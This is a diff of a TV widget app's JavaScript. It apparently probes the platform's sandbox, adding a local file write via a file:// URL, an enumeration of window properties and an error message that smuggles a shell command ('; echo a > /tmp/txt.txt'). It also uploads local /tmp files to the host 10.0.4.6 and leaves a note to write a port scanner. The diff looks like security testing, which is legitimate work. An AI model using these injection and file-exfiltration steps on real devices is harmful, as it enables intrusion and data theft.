@@ -42,14 +42,39 @@ function uploadFile(filename, appendFile){
 	var xhr = new XMLHttpRequest();
 	xhr.open("POST", "http://10.0.4.6/upload", true);
 	type = "text/plain";
-	type = "application/octet-stream";
+	//type = "application/octet-stream";
 	xhr.setRequestHeader("Content-Type", type);
 	files = filename.split("/");
 	xhr.setRequestHeader("X-Filename", filename.split("/")[files.length - 1]);
 	xhr.send(file);
 }
-function realOnload(){
 
+function realOnload(){
+	var xhr = new XMLHttpRequest();
+	console.log("created xhr");
+	xhr.open("PUT", "file:///tmp/test.txt", true);
+	console.log("set type and url00");
+	xhr.setRequestHeader("Content-Type", "text/plain");
+	console.log("set request headers");
+	xhr.send("hello world");
+	console.log("sent xhr? file write.");
+	
+	let keys = Object.getOwnPropertyNames(window);
+	let i = 0;
+	while (i < keys.length) {
+	  try {
+	    console.log(keys[i]);
+	  } catch (e) {
+	    console.log("inaccessible");
+	  }
+	  i++;
+	};
+	
+	throw new Error("InjectedLogTest; echo a > /tmp/txt.txt");
+	//write port scanner
+	
+	uploadFile("/tmp/txt.txt",true);
+	uploadFile("/tmp/test.txt", true);
 }
 
 Main.onLoad = function()
@@ -59,18 +84,14 @@ Main.onLoad = function()
 	widgetAPI.sendReadyEvent();
 };
 
-Main.onUnload = function()
-{
-
-};
+Main.onUnload = function(){};
 
 Main.enableKeys = function()
 {
 	document.getElementById("anchor").focus();
 };
 
-Main.keyDown = function()
-{
+Main.keyDown = function(){
 	var keyCode = event.keyCode;
 	console.info("pressed key");
 	console.info(keyCode);
@@ -100,5 +121,5 @@ Main.keyDown = function()
 		default:
 			//addCode();
 			break;
-	}
+	};
 };
